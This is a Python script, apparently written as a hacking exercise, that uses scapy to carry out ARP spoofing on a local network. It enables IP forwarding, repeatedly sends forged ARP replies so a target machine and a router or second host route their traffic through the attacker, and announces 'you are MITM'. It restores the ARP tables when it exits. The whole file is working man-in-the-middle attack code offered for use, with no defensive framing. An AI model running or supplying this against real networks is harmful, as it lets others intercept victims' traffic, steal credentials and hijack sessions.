import scapy.all as scapy
import optparse
import time
import subprocess


def get_arguments():
    arguments = optparse.OptionParser()
    arguments.add_option("-t", "--target", action="store", metavar='\b', dest="target_ip", help="target ip[machine-1]")
    arguments.add_option("-s", "--spoof", metavar='\b', dest="spoof_ip", help="spoof ip[machine-2](router or another machine on local network)")
    arguments.add_option("-p", "--sleep", metavar='\b', dest="sleeptime", default=0, help="time to sleep after sending a packet(default=0)")
    arguments.add_option("-c", "--count", metavar='\b', dest="count", default=1000, help="number of packets to be sent(default=1000)")
    values, options = arguments.parse_args()
    if not (values.target_ip and values.spoof_ip):
        arguments.error("give arguments\n[+]HELP: python3 arp_spoofer.py -h")
    return values


def get_mac(ip):
    try:
        arp_packet = scapy.ARP(pdst=ip)
        brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        create_packet = brodcast/arp_packet
        sendpacket = scapy.srp(create_packet, timeout=1, verbose=False)[0]
        return sendpacket[0][1].hwsrc
    except IndexError:
        print("[-]{} is not active ...Try again".format(ip))
        exit()


def restore(target_ip, spoof_ip):
    for i in range(0, 2):
        spoof_real_mac = get_mac(spoof_ip)
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=spoof_real_mac, hwdst=target_mac)
        # print(packet.summary())
        scapy.send(packet, count=2, verbose=False)
        p = target_ip
        target_ip = spoof_ip
        spoof_ip = p
    print("\n[+]ARP tables are back to original macs on both machines")


def spoof(target_ip, spoof_ip, count, sleeptime):
    print("ARP-spoofer coded by @koushik")
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print("[+]ip forwarding enabled")
    print("[+]( machine1 )-<->-( YOU )-<->-( machine2 )")
    h = int(sleeptime)
    v = int(count)
    try:
        for i in range(1, v+1):
            target_mac = get_mac(target_ip)
            # print("[+]target mac: {}".format(target_mac))
            create_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
            scapy.send(create_packet, verbose=False)
            # destination = scapy.Ether(dst=target_mac)
            # final_packet = destination/create_packet
            # send_packet = scapy.srp(final_packet, timeout=1, verbose=False)
            time.sleep(h)
            p = target_ip
            target_ip = spoof_ip
            spoof_ip = p
            # print("[+]target ip: {}".format(target_ip))
            # print("[+]spoof ip: {}".format(spoof_ip))
            print("\r[+]sent {} packets to both machines, you are MITM :-)".format(i), end=" ")
            # print("---------------------------------------------------------------")
    except KeyboardInterrupt:
        restore(target_ip, spoof_ip)
        print("[+]OK Quiting... youre not MITM :-(")
        exit()

    restore(target_ip, spoof_ip)
    print("[+]OK Quiting... youre not MITM :-(")


values = get_arguments()
spoof(values.target_ip, values.spoof_ip, values.count, values.sleeptime)
